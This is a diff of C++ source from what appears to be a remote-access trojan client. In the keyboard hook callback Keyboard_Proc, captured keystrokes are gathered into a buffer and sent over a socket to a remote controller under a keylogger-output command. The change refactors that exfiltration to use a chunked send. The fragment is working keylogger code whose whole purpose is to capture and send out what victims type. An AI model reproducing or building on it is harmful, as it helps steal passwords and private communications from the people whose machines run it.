@@ -363,10 +363,7 @@ LRESULT CALLBACK Keyboard_Proc(int nCode, WPARAM wparam, LPARAM lparam) {
             strTempBuffer += "]";
         }
         strTempBuffer += c_KeyMap((unsigned int)kbs->vkCode);
-        std::string strComando = std::to_string(EnumComandos::KL_Salida);
-        strComando.append(1, CMD_DEL);
-        strComando += strTempBuffer;
-        cCliente->cSend(cCliente->sckSocket, strComando.c_str(), strComando.size(), 0, false, nullptr);
+        cCliente->cChunkSend(cCliente->sckSocket, strTempBuffer.c_str(), strTempBuffer.size(), 0, true, nullptr, EnumComandos::KL_Salida);
     }
     else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {
         DWORD key = kbs->vkCode;
@@ -378,10 +375,7 @@ LRESULT CALLBACK Keyboard_Proc(int nCode, WPARAM wparam, LPARAM lparam) {
 
             strTempBuffer += Add_Terminator(c_KeyMap((int)kbs->vkCode));
 
-            std::string strComando = std::to_string(EnumComandos::KL_Salida);
-            strComando.append(1, CMD_DEL);
-            strComando += strTempBuffer;
-            cCliente->cSend(cCliente->sckSocket, strComando.c_str(), strComando.size(), 0, false, nullptr);
+            cCliente->cChunkSend(cCliente->sckSocket, strTempBuffer.c_str(), strTempBuffer.size(), 0, true, nullptr, EnumComandos::KL_Salida);
         }
 
     }
